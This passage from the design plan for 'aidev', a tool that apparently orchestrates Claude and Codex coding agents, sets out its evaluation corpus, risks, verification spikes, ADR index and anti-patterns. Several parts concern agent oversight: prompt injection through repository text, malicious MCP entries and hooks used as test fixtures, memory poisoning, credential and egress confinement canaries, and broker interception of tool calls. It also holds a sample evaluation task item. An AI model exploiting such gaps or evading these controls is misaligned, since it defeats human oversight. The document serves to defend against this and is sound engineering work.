| `aidev approve <gate-id>` / `deny` | Resolve a human gate |
| `aidev cancel` / `resume` | Lifecycle control |
| `aidev outcome <run> --clean\|--defect\|--revert` | Ground truth for lagging metrics |
| `aidev memory list\|show\|approve` | Canonical knowledge |
| `aidev trust review\|approve\|list` | Local trust root for repo-owned aidev config (P-22) |
| `aidev journal <run>` | Action journal: open, reconciled, voided, and halted attempts |
| `aidev env list\|provision\|gc` | Environment store, by platform-complete `EnvKey` |
| `aidev doctor` | Probe CLIs, tools, daemons, cache health, DB |
| `aidev eval run\|report` | Evaluation harness |
| `aidev gc` | Workspace cleanup |
| `aidevd` | Daemon (auto-started) |

`aidev cost` is the operator's window into §2.1 and should be the second command anyone learns.

---

## 22. Evaluation and open experiments

### 22.1 Corpus

≥30 tasks from real project history: small bug · cross-file feature · API change · frontend
behaviour · migration · authorization · dependency update · concurrency bug · performance
regression · large refactor · security vulnerability. Hidden tests never appear in the worktree.

```yaml
id: auth-role-check-001
repo: fixtures/repo-a
base_commit: 9f2c1ab
request: "Editors should not be able to delete published posts."
hidden_tests: tests/hidden/test_auth_matrix.py
expected_class: R3
expected_risk_dimensions: [security, blast_radius]
forbidden_behaviors: [modifies test assertions, adds a dependency, touches migrations]
budget: { max_wall_s: 900 }
```

### 22.2 Statistics and decision thresholds (P-27, P-32)

Binary success → beta-binomial credible intervals, report the interval not the point. Token and time
→ bootstrap paired differences on identical tasks. Post-merge failures → tracked individually,
never averaged.

**Thresholds are declared before the comparison runs**, not chosen after seeing it. There are **two
different quality gates**, and v3.0 conflated them by attaching a −2pp margin to a ~40-task corpus
that cannot resolve it:

| Gate | Purpose | Default threshold |
|---|---|---|
| **M5.5 early guardrail** | Stop gross regressions before behavioural milestones | Reject when the lower credible bound on paired pass-rate difference falls below **−10pp**. A safety brake, not evidence of equivalence |
| **Final non-inferiority** | Claim quality did not materially regress | **−2 percentage points**; ship only when the lower bound is above −2pp |

The final gate is **sample-adaptive**: add paired tasks and repeats until the interval is decisive or
the evaluation budget is explicitly exhausted. If the interval stays wider than the margin, the
answer is `UNDETERMINED` — never "no regression".

| Secondary question | Test | Threshold |
|---|---|---|
| Did tokens improve? | Bootstrap paired ratio | Point estimate plus interval; reported, no gate |
| Did latency improve? | Bootstrap paired ratio | Same |

Two measurement traps this closes:

- **Survivorship.** A fast-path run that escalates must be counted in the fast-path column at its
  full end-to-end cost. Excluding the expensive failures makes the fast path look excellent and the
  number meaningless.
- **Variance.** 20 + 20 tasks detect a large regression, not a small improvement. Where model
  sampling variance matters, repeat trials; where it does not (deterministic components), do not
  waste quota.

Never loosen a policy on a handful of successes.

### 22.3 Change gate

```text
analytics → recommendation → offline eval → paired comparison → human approval
         → new version → canary on low-risk tasks only
```

### 22.4 Open experiments

These measure what is currently unmeasured. Each has a cheapest test and a milestone.

| ID | Question | Cheapest test | Milestone |
|---|---|---|---|
| **E-01** | Real token and latency decomposition for *our* workers | Instrument 20 R0 + 20 R1 tasks; log input/cache-read/cache-creation/output and phase timings | M6 |
| **E-02** | Long-session vs 3-call crossover | Same 20 R1 tasks solo vs fast path; compare billable tokens and wall clock | M6 |
| **E-03** | Classifier **directional** error at the R1/R2 and R2/R3 boundaries | Independently label ≥100 historical PRs; report a full confusion matrix. Gate on R2+ recall, R3 recall, underclassification rate (one-sided bound), and false-escalation rate — accuracy secondary (P-40). Preflight and post-diff carry different thresholds (§M3). **Schedule labelling during M1–M2**; it is a data task, not a discovery at M3 exit | M3 |
| **E-04** | Defects caught per second by check type | Inject known agent-failure classes; measure which of parse/type/test/lint catches each and how fast | M8 |
| **E-05** | Closure-predicate sufficiency | 50 tasks: correctness with closure-gated context vs +2 extra files | M8 |
| **E-06** | Conditional-reviewer value | A/B reviewer on/off on 50 R1 tasks; measure escaped defects *and* induced regressions | M8 |

E-03 gates M3's exit. E-01/E-02 gate M6's exit. The rest inform M9 tuning.

---

## 23. Project risks

| Risk | Mitigation |
|---|---|
| Provider CLI/SDK behaviour changes under us | Capability probe, version recorded per call, recorded-stream adapter tests, S-01 re-run each milestone |
| **Provider silently changes cache defaults** | P-17 cache-health metric as early warning; treat a ratio drop as a provider change until disproven |
| Static core underperforms and everything escalates | E-03 gates M3; if accuracy is low, keep a cheap model classifier for the mid-band rather than abandoning the design |
| Warm daemons leak memory across many worktrees | Bounded concurrent warm worktrees; idle eviction; measured in M5 |
| M0 instrumentation treated as optional | It is an M0 exit criterion; without it M6 cannot be evaluated |
| Scope creep back toward v1.0's uniform FSM | The two-track split is P-01; adding fast-path stages requires eval evidence |
| Security work deferred "until it works" | M2 precedes M4 by construction |
| Optimising on vibes | D-34 + M8 gate |
| **S-07 fails on both providers** | Heavy-path workers ship `PATCH_ONLY` and the OS sandbox moves into M7. The fast path is unaffected — it is tool-less by design |
| **S-08 cannot prove tool-less or read confinement for a provider** | That provider is **not eligible as a fast-path implementer** until a no-tools mode or stronger isolation proves the invariant. Do not weaken P-29 to fit a provider |
| **Trust-root prompts become approval fatigue** | Approval is per-file and per-content, and fires only on change. An **explicitly human-approved memory promotion records its resulting hash in the trust root automatically** — the human already approved that exact content, so it is not a second prompt and not a bypass of §15. Measure prompt rate in M6 and tune if it exceeds a few per week |
| **Env store grows without bound, or reuses an incompatible native environment** | Platform-complete `EnvKey` + active leases + LRU eviction among unleased entries; reported by `aidev doctor` |
| Single-developer bandwidth | Product is useful from M6; heavy path can lag |

---

## 24. Verify before coding

| ID | Spike | Box | Blocks |
|---|---|---|---|
| **S-01** | Capture `--help` and recorded event streams from the *installed* Claude and Codex versions; confirm every flag and field used in §8.4; check for a persistent server/daemon mode on each; confirm whether cached reads count against rate limits per model | 1.5 d | M4 |
| **S-02** | Fill the model registry with current lineups, effort level names, and per-tier defaults | 0.5 d | M4 |
| **S-03** | Prove the untrusted-repo hardening blocks execution: fixture repo with a canary-writing hook and a malicious MCP entry, run both workers with and without the flags | 1 d | M4 |
| **S-04** | Measure cache mechanics empirically per provider: minimum prefix, actual TTL behaviour, write premium, automatic prefix extension across turns, and what a prefix mutation costs. Determines each adapter's strategy for `project_prefix_cached` and `task_context_cached` (P-21) | 1 d | M4 |
| **S-05** | Symbol resolver selection: pyright vs alternatives for the closure predicate; ts-morph vs tsc for TS; warm daemon startup and incremental times | 1 d | M3 |
| **S-06** | Baseline test/lint/build/typecheck times **and environment provisioning**: cold provision, warm reuse and materialisation, **platform-complete `EnvKey` compatibility across the supported OS/arch/runtime/toolchain matrix**, atomic publish and crash recovery, steady-state footprint, and verification with network denied (§15A) | 1.5 d | M3 |
| **S-07** | **Broker mediation.** Prove per-action interception for each provider: can a tool call be seen and denied *before* execution, from aidev's process? Test the permission-callback, pre-tool-hook, and persistent-server-approval paths. Record the outcome per provider. **A provider that fails is restricted to `PATCH_ONLY`** — this spike can invalidate the heavy-path design, which is why it runs before M4 | 2 d | M4, M7 |
| **S-08** | **Credential, read-root, and egress confinement canaries — one per mode.** Prove `PATCH_ONLY` exposes no usable read or exec surface and cannot retrieve repo or home canaries omitted from its context packet. Prove `BROKERED_TOOLS` can call the model while a tool can neither read auth material, nor read outside declared roots, nor reach an unapproved host. Both providers, both OSes. Becomes a permanent CI test | 2 d | M4 |

Treat as known-to-drift and re-check every milestone: model names and tiers, effort level names,
usage and cache field names, sandbox flag names, permission-mode names, cache TTL defaults.

---

## 25. ADR index

| ADR | Title | Decisions | Milestone |
|---|---|---|---|
| 001 | Deterministic control-plane ownership | D-01, I-01 | M0 |
| 002 | **Two-track execution: fast path and heavy path** | P-01 | M0 |
| 003 | SQLite state, append-only events, snapshots | D-03, D-04 | M0 |
| 004 | Artifact contracts and versioning | D-10, D-11 | M0 |
| 005 | Checkpoint and recovery semantics | D-35, I-08 | M0 |
| 006 | **Instrumentation as a foundational requirement** | P-18 | M0 |
| 007 | Git worktree isolation | D-05 | M1 |
| 008 | Dirty-working-copy policy | D-06 | M1 |
| 009 | Action Broker architecture | D-19 | M2 |
| 010 | Default-deny secrets and network | D-21 | M2 |
| 011 | Policy: typed invariants + tighten-only YAML | D-22, D-23 | M2 |
| 012 | Human action gates | I-09 | M2 |
| 013 | **Model-free localization and classification** | P-06, I-12 | M3 |
| 014 | **The closure predicate as the sufficiency gate** | P-08, P-07 | M3 |
| 015 | **Test impact analysis with fail-safe** | P-09 | M3 |
| 016 | Multidimensional risk model | D-12, D-13 | M3 |
| 017 | **Warm sessions and the byte-stable invariant block** | P-02, P-03, I-11 | M4 |
| 018 | **Fast-path call budget and structured implementation** | P-04, P-05 | M4 |
| 019 | Provider adapters and capability negotiation | D-07 | M4 |
| 020 | Untrusted-repository hardening | I-10, P-16 | M4 |
| 021 | Sandbox backend abstraction | D-20 | M4 |
| 022 | **Warm type daemons and fail-fast ordering** | P-10, P-11 | M5 |
| 023 | Deterministic verification ownership | D-24, I-06 | M5 |
| 024 | **Effort tiering and oracle-keyed escalation** | P-12, P-13 | M6 |
| 025 | **Conditional review and the diff-size ceiling** | P-14, P-15 | M7 |
| 026 | Finding adjudication | D-28 | M7 |
| 027 | Independent review context | D-29 | M7 |
| 028 | Usage, cache health, and cost semantics | D-33, P-17 | M8 |
| 029 | Telemetry schema and OTel mapping | D-31, D-32 | M8 |
| 030 | Evaluation before optimisation | D-34, P-27 | M5.5 |
| 031 | **Two-phase assessment: preflight and post-diff** | P-19, I-16 | M3 |
| 032 | **Risk floors: `risk_floor` vs `force_heavy`** | P-19 | M3 |
| 033 | **Worker execution modes and Broker mediation** | P-20, D-19 | M4 |
| 034 | **Three-concept cache model** | P-21 | M4 |
| 035 | **Local trust root for repo-owned aidev config** | P-22, I-14, P-30 | M2 |
| 036 | **Action journal and per-verb reconciliation** | P-23, I-15, P-30 | M2 |
| 037 | **argv-only execution; shell by approval or gate** | P-24, I-13 | M2 |
| 038 | **Control-plane egress vs tool egress** | P-25, I-17, P-30 | M2 |
| 039 | **Platform-complete environment identity and provisioning** | P-26, P-31, I-21 | M3 |
| 040 | **Repairs must re-enter post-diff assessment** | P-28, I-19 | M0 / M6 |
| 041 | **Tool-less fast path and Broker-mediated read authority** | P-29, I-18 | M4 |
| 042 | **Sample-aware evaluation gates** | P-32 | M5.5 / M8 |
| 043 | **Independent localization ground truth** | P-33 | M3 / M5.5 |
| 044 | **Hash-guarded structured patch contract** | P-34, I-20 | M4 |
| 045 | **Durable logical action identity** | P-35, I-22 | M2 |
| 046 | **Logical quarantine and neutral provider pre-warm** | P-36 | M1 / M4 |
| 047 | **Interception, not containment, grants tool authority** | P-37, I-23, D-19 | M4 / M7 |
| 048 | **Append-only ordinal assessments** | P-38, I-24 | M0 / M3 |
| 049 | **Workspace generation and effect scope** | P-39, I-25 | M2 |
| 050 | **Directional classifier gates** | P-40 | M3 |
| 051 | **Public contract change vs public API touch** | P-19 | M3 |
| 052 | **One rollback primitive; generation + watermark cut** | P-39, I-25 | M2 |
| 053 | **No opt-back-in for repo-native agent config in v1** | P-41, I-10 | M2 |

---

## Appendix A — Anti-patterns

| Anti-pattern | Why it fails | Instead |
|---|---|---|
| One giant autonomous agent | Shared bias, uncontrolled agency | Deterministic control plane |
| Model decides stage completion | Nondeterministic lifecycle | FSM guards, no model in the transition path |
| Model asserts tests pass | Assertion is not evidence | Run the tests; read the table |
| **A model call where a compiler would do** | Pure token and latency waste | Static core (I-12) |
| **Fresh invariant context every stage** | Destroys cache locality; re-pays stable content | Byte-stable invariant block + provider-specific task-context caching |
| **A process per stage** | Cold-start tax × stage count | Warm session pool |
| **Ceremony stages at low complexity** | Cost with no measured quality contribution | Two-track split |
| **Mandatory review of small correct diffs** | Low precision; false positives induce regressions | Conditional, deterministic-finding-gated review |
| **Full suite when a subset suffices** | Multiplies the dominant latency term | Impacted-test selection with fail-safe |
| **Cold type-checker per verification** | ~10× the warm cost, every time | Warm daemon per worktree |
| Whole-repo prompt | Dilutes evidence; degrades correctness | Closure-bounded context, ≤10 files |
| **Line-level over-slicing** | Noise amplification; degrades repair | File + symbol closure |
| One long chat across stages | Context pollution and anchoring | Bounded calls with a shared prefix |
| Same-context self-review | Anchoring | Forked session, diff-only append |
| Infinite retry of the same prompt | Burns quota, learns nothing | Failure taxonomy; a retry must change something |
| **Escalating model/effort on model confidence** | Poorly calibrated | Escalate from an attempt on deterministic verification evidence; path escalation has its own triggers |
| Repo text treated as instruction | Prompt injection | Trust labels + broker + provenance escalation |
| **Repo agent config left in place** | Silent code execution in headless mode | Hardening flags + quarantine |
| Frontier model everywhere | Latency and quota waste | Capability routing, effort tiering |
| Cheapest model everywhere | Safety loss | Risk floors |
| Indiscriminate vector recall | Memory noise and poisoning | Canonical memory + selective retrieval |
| Auto-promoted model opinions | Knowledge poisoning | Evidence-backed, human-approved promotion |
| Generated tests as truth | Tests encode generated assumptions | Execute and review them |
| Maximum parallelism | Semantic merge conflicts | Write-set DAG, serialise on overlap |
| Silent stash/reset | User data risk | Build from HEAD; say so |
| Unlimited shell and network | Injection gains authority | Broker + sandbox + default deny |
| API cost shown as plan cost | Misleading economics | "API-equivalent estimate" |
| Self-optimising gates | Safety drift | eval → recommendation → human |
| **Classifying with facts that don't exist yet** | The tier is decided from a diff that hasn't been written | Preflight vs post-diff, enforced by type |
| **"The sandbox is the boundary"** | A sandbox bounds damage; it produces no per-action record | `PATCH_ONLY`, or proven interception |
| **Parsing shell to make it safe** | Every operator is a bypass class | argv + `shell=False`; shell only by approval |
| **Trusting your own config because it's yours** | Repo-owned config is repo-owned, whoever wrote the format | Local trust root, approved hashes |
| **"No duplicate side effects" without a journal** | Crash mid-effect leaves an unanswerable question | Action states + idempotency keys + per-verb reconciliation |
| **Worktree isolation mistaken for environment isolation** | No venv, no deps, network denied — nothing runs | Provisioned envs keyed by platform-complete `EnvKey` |
| **Measuring the fast path without its failures** | Escalations excluded make any ratio look good | End-to-end accounting including escalated runs |
| **Giving a closure-complete model read tools anyway** | Unnecessary authority over unrelated local files | Tool-less `PATCH_ONLY` + neutral cwd |
| **Repair → READY without reassessment** | A repair widens blast radius exactly as a first patch can | `REPAIR → POSTDIFF → VERIFY` |
| **Fuzzy-applying a model patch** | Stale context silently mutates the wrong code | Expected base and result hashes; mismatch re-localizes or escalates |
| **Calling patch membership localization ground truth** | The patch is conditioned on the localizer | Independent gold labels; membership is utilization only |
| **Keying an environment by lockfile alone** | Native and runtime incompatibility is invisible | Platform-complete `EnvKey` |
| **Physically moving quarantined config** | Manufactures deletions that pollute the diff and POSTDIFF | Logical quarantine or sanitized view |
| **Deriving action identity from the retry counter** | A retry becomes a different action and loses its history | Durable `action_id` allocated at `PLANNED` |
| **Claiming 2pp non-inferiority from ~40 tasks** | The interval is far wider than the margin | Early gross-regression guard, then a sample-adaptive final gate |
| **Provisioning before the boundary exists** | The first external effect precedes its own audit trail | Trust root, journal, and egress split in M2 |
| **Letting a sandbox stand in for interception** | Containment is not authority and leaves no decision record | `BROKERED_TOOLS` only on proven S-07; sandbox underneath, never instead |
| **One assessment row per phase** | A repair's reassessment silently clobbers the original | Append-only ordinal chain |
| **Trusting a `SUCCEEDED` local effect across a rollback** | The journal describes a tree that no longer exists | Generation-scoped local effects; void and re-derive |
| **Voiding on generation alone** | Also discards effects the checkpoint already contains, re-deriving work that exists | Cut at `generation == old AND attempt_seq > watermark` |
| **Two rollback implementations** | Recovery is careful, the other one isn't, and only one gets tested | A single `rollback_to_checkpoint()` |
| **An absolute invariant with an approval escape hatch** | It is no longer an invariant, and the hatch is what gets attacked | Delete the path; defer it with a revival trigger |
| **Gating a safety classifier on accuracy** | All the errors can be in the dangerous direction | R2+/R3 recall and a bounded underclassification rate |
| **Treating an API touch and an API contract change alike** | Either over-escalates routine work or under-escalates a breaking change | Two floors: touch stays R1-eligible, contract change forces heavy |

## Appendix A2 — Implementation order for M0–M2

The plan says *what*; this says *in what order to type it*. Nothing here overrides a milestone exit
criterion.

```text
M0  contracts + IDs
    SQLite + migrations + pragmas
    event log + content-addressed store
    minimal linear fast FSM (PREPARE→IMPLEMENT→POSTDIFF→VERIFY→READY, REPAIR→POSTDIFF)
    stage attempts + checkpoints (incl. workspace_generation, action_attempt_watermark)
    FakeWorker
    daemon on UDS
    instrumentation: tokens, three cache concepts, phase_timing
    crash-boundary test matrix

M1  worktree manager
    checkpoint commits
    dirty-tree guarantees
    logical quarantine + manifest
    workspace reconciliation

M2  Broker core + verb taxonomy
    argv-only proc.exec (resolved allowlist, typed arg schemas, closed wrapper set)
    path/root canonicalisation + enforcement
    env scrubber (build_env as the single spawn path)
    policy merge + frozen human gates
    trust root
    action_journal (logical) + action_attempt (attempt_seq)
    checkpoint action_attempt_watermark
    rollback_to_checkpoint() — the ONLY reset path
    control-plane / tool egress split
    crash + red-team suites
```

Two things to schedule alongside, not after: **E-03's ≥100 historical PR labels** (a data task that
gates M3), and **S-05/S-06** (which gate M3's start).

## Appendix B — Deferred, with revival triggers

| Deferred | Revive when |
|---|---|
| Vector memory / Mem0 / Qdrant | FTS5 + metadata recall is measurably insufficient on ≥500 runs |
| Repomix / structural compression | A use case appears that closure-bounded context cannot serve |
| LangGraph or Temporal as control plane | Execution genuinely spans machines |
| OPA / Rego / Cedar | Policy is authored by someone other than the single user |
| Learned routing / contextual bandits | ≥500 evaluated runs with stable metrics |
| Agent swarms | Paired eval shows a gain over risk-triggered specialists |
| Autonomous production deployment | Never in v1; separate safety design required |
| gVisor / VM-backed sandboxes | Strict R3 needed where bubblewrap/podman are unavailable |
| Windows support | After macOS/Linux stability; needs named pipes and a different sandbox story |
| Parallel writers inside a stage | Sequential correctness proven and write-set prediction validated |
| Cloud dashboard, team features, IAM | Outside the single-user product definition |
| Plugin marketplace | After a plugin trust and pinning model exists |
| Include-working-copy mode | v1.1; needs a snapshot that provably never touches the index |
| Opt-back-in for repo-native agent config (`.claude/`, `.mcp.json`, `.codex/`) | A concrete workflow proves it is needed **and** the Broker can mediate every capability that config grants — i.e. after S-07 succeeds and `BROKERED_TOOLS` is real. Until then, executing another agent's repo config is a tool-surface aidev does not control (P-41) |

## Appendix C — The architecture in one picture

```text
                         USER INTENT
                              │
                   DETERMINISTIC CONTROL PLANE
                    policy · state · routing
                              │
              ┌───────────────┴───────────────┐
              │                               │
        STATIC CORE                     RISK FLOORS
   localize · classify · closure       (never lowered)
        TIA · co-change                       │
              └───────────────┬───────────────┘
                              │
                     BOUNDED CONTEXT
                ≤10 files · symbol closure
                  trust + provenance
                              │
                  WARM SESSION · CACHE DISCIPLINE
                 1 call typical, 3 max · TOOL-LESS
                              │
                   HASH-GUARDED PATCH APPLY
                              │
                    POST-DIFF REASSESSMENT
              (repairs return here — never skip it)
                              │
                        ACTION BROKER
                   least-privilege sandbox
                              │
                     ISOLATED WORKSPACE
                              │
                  DETERMINISTIC EVIDENCE
          parse → type (warm) → impacted tests → scans
                              │
                    CONDITIONAL REVIEW
              (only on a deterministic finding)
                              │
                    HUMAN GATE (frozen list)
                              │
                            READY

  ╔══════════════════════════════════════════════════════════╗
  ║  tokens · cache health · phase timings · localizer       ║
  ║  precision · evidence · findings · evals · knowledge     ║
  ╚══════════════════════════════════════════════════════════╝
```

---

**The thesis, restated.** aidev does not beat a coding agent by thinking harder. It beats one by
*not thinking about what a compiler already knows*, by *not paying twice for the same prefix*, by
*not holding authority it has no use for*, and by *not declaring success without evidence*. The
cognitive workers are Claude and Codex today and something else in eighteen months. The static core,
the cache discipline, the tool-less low-risk boundary, and the evidence gate are the product.
